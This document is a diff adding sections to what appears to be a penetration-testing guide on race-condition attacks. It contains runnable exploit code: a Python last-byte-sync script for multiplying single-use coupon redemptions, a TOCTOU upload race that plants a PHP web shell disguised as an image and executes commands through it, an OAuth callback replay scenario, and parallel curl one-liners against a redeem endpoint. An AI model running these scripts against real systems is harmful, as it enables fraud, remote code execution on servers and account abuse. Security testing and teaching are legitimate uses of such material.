@@ -305,6 +305,151 @@ asyncio.run(race_single_packet(
 ))
 ```
 
+### Last-Byte Synchronization (Manual)
+
+When HTTP/2 isn't available and Turbo Intruder isn't an option:
+
+```text
+Technique:
+1. Send all requests EXCEPT the final byte of each body
+2. Server holds all connections open, waiting for complete request
+3. Send all final bytes simultaneously (single write per socket)
+4. All requests complete processing at the same instant
+
+Why it works:
+- TCP Nagle's algorithm batches small writes
+- Server can't start processing until full Content-Length received
+- Releasing all final bytes in one syscall achieves sub-millisecond sync
+```
+
+```python
+#!/usr/bin/env python3
+"""Last-byte sync race condition (no HTTP/2 required)"""
+import socket, ssl, threading, time
+
+TARGET = "target.com"
+PORT = 443
+PATH = "/api/redeem"
+BODY = '{"coupon":"DISCOUNT50"}'
+COOKIE = "session=abc123"
+N = 20
+
+def build_request():
+    req = (
+        f"POST {PATH} HTTP/1.1\r\n"
+        f"Host: {TARGET}\r\n"
+        f"Cookie: {COOKIE}\r\n"
+        f"Content-Type: application/json\r\n"
+        f"Content-Length: {len(BODY)}\r\n"
+        f"\r\n"
+        f"{BODY[:-1]}"  # Everything except last byte
+    )
+    return req.encode(), BODY[-1].encode()
+
+def race_worker(barrier, results, idx):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    sock = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
+    sock.connect((TARGET, PORT))
+    
+    req_partial, last_byte = build_request()
+    sock.send(req_partial)
+    
+    # Wait for all threads to be ready
+    barrier.wait()
+    
+    # Send last byte simultaneously
+    sock.send(last_byte)
+    
+    # Read response
+    resp = sock.recv(4096).decode(errors='ignore')
+    status = resp.split(' ')[1] if ' ' in resp else '???'
+    results[idx] = status
+    sock.close()
+
+barrier = threading.Barrier(N)
+results = [''] * N
+threads = [threading.Thread(target=race_worker, args=(barrier, results, i)) for i in range(N)]
+
+for t in threads:
+    t.start()
+for t in threads:
+    t.join()
+
+print(f"Results: {dict((s, results.count(s)) for s in set(results))}")
+```
+
+### File Upload Race (TOCTOU)
+
+Exploit the window between file upload and server-side validation/deletion:
+
+```python
+#!/usr/bin/env python3
+"""Race: upload malicious file + access before validation deletes it"""
+import threading, requests
+
+TARGET_UPLOAD = "https://target.com/upload"
+TARGET_ACCESS = "https://target.com/uploads/shell.php"
+COOKIES = {"session": "abc123"}
+
+def upload():
+    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/png')}
+    requests.post(TARGET_UPLOAD, files=files, cookies=COOKIES, verify=False)
+
+def access():
+    for _ in range(200):
+        r = requests.get(f"{TARGET_ACCESS}?cmd=id", cookies=COOKIES, verify=False)
+        if "uid=" in r.text:
+            print(f"SUCCESS: {r.text.strip()}")
+            return True
+    return False
+
+# Run upload + rapid access simultaneously
+for attempt in range(10):
+    t1 = threading.Thread(target=upload)
+    t2 = threading.Thread(target=access)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+```
+
+**When to try:** File upload exists + server validates AFTER saving (check by uploading `.php` — if you get "file type not allowed" but the file briefly exists at the upload path, it's vulnerable).
+
+### OAuth State Race
+
+```text
+Attack scenario:
+1. Initiate OAuth flow → receive state token
+2. Send multiple parallel callbacks with the SAME authorization code + state
+3. If state is consumed non-atomically:
+   - Multiple accounts get linked to victim's OAuth
+   - Or: same auth code exchanged multiple times for different tokens
+
+Test:
+- Capture OAuth callback URL (with code= and state=)
+- Replay it 20x in parallel
+- Check if multiple sessions/accounts are created
+
+Impact: Account linking abuse, session multiplication
+```
+
+### curl One-Liner for Quick Race Test
+
+```bash
+# GNU Parallel (most accessible)
+seq 1 50 | parallel -j 50 "curl -s -o /dev/null -w '%{http_code}\n' \
+  -X POST 'https://target.com/api/redeem' \
+  -H 'Cookie: session=abc123' \
+  -H 'Content-Type: application/json' \
+  -d '{\"code\":\"SINGLE-USE\"}'"
+
+# Count successes
+seq 1 50 | parallel -j 50 "curl -s -X POST 'https://target.com/api/redeem' \
+  -H 'Cookie: session=abc123' -d 'code=SINGLE-USE'" | grep -c "success"
+```
+
 ### Validation Requirements
 
 **A race condition is confirmed when:**
